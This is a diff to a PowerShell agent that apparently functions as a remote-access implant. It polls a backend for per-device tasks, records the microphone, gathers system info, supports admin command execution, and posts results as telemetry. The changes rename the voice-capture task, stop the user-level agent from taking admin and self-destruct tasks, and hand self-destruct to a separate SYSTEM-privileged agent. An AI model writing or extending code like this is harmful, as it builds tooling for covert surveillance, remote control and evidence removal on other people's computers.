@@ -477,7 +477,7 @@ function Execute-TaskWithTimeout {
                 $result = Get-SystemInfo
             }
             
-            "voice_capture" {
+            "voice_record" {
                 $duration = 10
                 if ($taskParams -and $taskParams.duration) {
                     $duration = [int]$taskParams.duration
@@ -549,7 +549,7 @@ while ($true) {
         Invoke-API -endpoint "devices?device_id=eq.$deviceId" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null
         
         # Get pending tasks
-        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
+        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&task_type=not.in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
         
         if ($tasks) {
             # Ensure tasks is an array
@@ -584,7 +584,7 @@ while ($true) {
                         $taskResult = Get-SystemInfo
                     }
                     
-                    "voice_capture" {
+                    "voice_record" {
                         $duration = 10
                         if ($task.task_params -and $task.task_params.duration) {
                             $duration = [int]$task.task_params.duration
@@ -634,24 +634,17 @@ while ($true) {
                     }
                     
                     "auto_destruct" {
-                        # Send telemetry first before destroying
-                        $taskResult = Self-Destruct
-                        
-                        # Save results to telemetry before exit
+                        # Send telemetry that we received the command
                         $telemetryData = @{
                             device_id = $deviceId
-                            data_type = $taskResult.data_type
-                            data = $taskResult.data
+                            data_type = "destruct"
+                            data = "User agent received destruct - handing off to SYSTEM agent"
                         }
                         Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                         
-                        # Mark task complete
-                        Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
-                            status = "complete"
-                            completed_at = (Get-Date -Format "o")
-                        } | Out-Null
-                        
-                        # Exit the script
+                        # DO NOT mark task as complete - let the Admin agent pick it up
+                        # DO NOT try cleanup - user agent lacks privileges
+                        # Just exit gracefully
                         exit 0
                     }
                     
